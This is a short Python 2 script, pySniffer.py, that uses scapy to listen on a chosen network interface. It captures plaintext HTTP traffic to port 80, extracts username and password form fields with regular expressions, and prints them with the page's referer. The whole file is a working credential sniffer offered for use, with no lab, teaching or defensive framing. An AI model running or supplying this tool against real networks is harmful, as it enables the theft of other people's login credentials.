#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""Usage: pySniffer.py --i=ifName

Options:
    --i=ifName     interface name
    -h --help     Show this screen
"""
from scapy.all import *
import docopt
import re




def pktTCP(pkt):
    global count
    if pkt.haslayer(TCP) and pkt.getlayer(TCP).dport == 80 and pkt.haslayer(Raw):
        carga = pkt.getlayer(Raw).load
        patronU = re.compile('user[a-zA-Z0-9_-]*=[a-zA-Z0-9_-]*&{1}')
        patronP = re.compile('pass[a-zA-Z0-9_-]*=[a-zA-Z0-9!¡"#$%()*+,\-./:;<=>¿?@\[\]^_`\'{|}~]*&{1}')
        usuario = patronU.findall(carga)
        password = patronP.findall(carga)
        if len(usuario) > 0 and len(password) > 0:
            u = re.search('=[a-zA-Z0-9_-]*&{1}', usuario[0])
            p = re.search('=[a-zA-Z0-9!¡"#$%()*+,\-./:;<=>¿?@\[\]^_`\'{|}~]*&{1}', password[0])
            ref = re.search('Referer: http://.*/{1}', carga)
            print ref.group()
            print "User: " + u.group()[1:-1]
            print "Password: " + p.group()[1:-1]


def main():
    try:
        arguments = docopt.docopt(__doc__)
        interfaceName = arguments['--i']
        sniff(iface = interfaceName, prn = pktTCP)

    except docopt.DocoptExit as e:
        print e.message


if __name__ == '__main__':
    main()
